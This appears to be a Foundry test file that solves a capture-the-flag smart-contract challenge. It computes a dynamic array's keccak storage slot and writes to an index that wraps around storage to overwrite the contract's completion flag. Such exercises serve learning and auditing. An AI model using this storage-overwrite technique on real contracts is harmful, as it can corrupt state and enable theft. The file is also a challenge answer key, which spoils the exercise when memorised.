// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMappingChallenge {
    function set(uint256 key, uint256 value) external;
    function get(uint256 key) external view returns (uint256);
    function isComplete() external view returns (bool);
}

contract Challenge4Test is Test {
    IMappingChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        address deployment = deployCode("4-Mapping.sol:MappingChallenge");
        target = IMappingChallenge(deployment);
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
    }

    
    function testExample() public {
        vm.startPrank(address(player));

        // slot 0
        emit log_named_uint("slot 0", uint256(keccak256(abi.encode(0))));
        // slot 1
        emit log_named_uint("slot 1", uint256(keccak256(abi.encode(1))));
        uint256 slot1 = uint256(keccak256(abi.encode(1)));

        target.set(type(uint256).max - slot1 + 1, 1);
        
        assertTrue(target.isComplete());
    }
    
    /*
    function testInvariantComplete(uint256 i, uint256 j) public {
        target.set(i, j);
        //emit log_named_uint("complete", target.isComplete() ? 1 : 0);

        assertTrue(target.isComplete() == false);

    }
    */
}
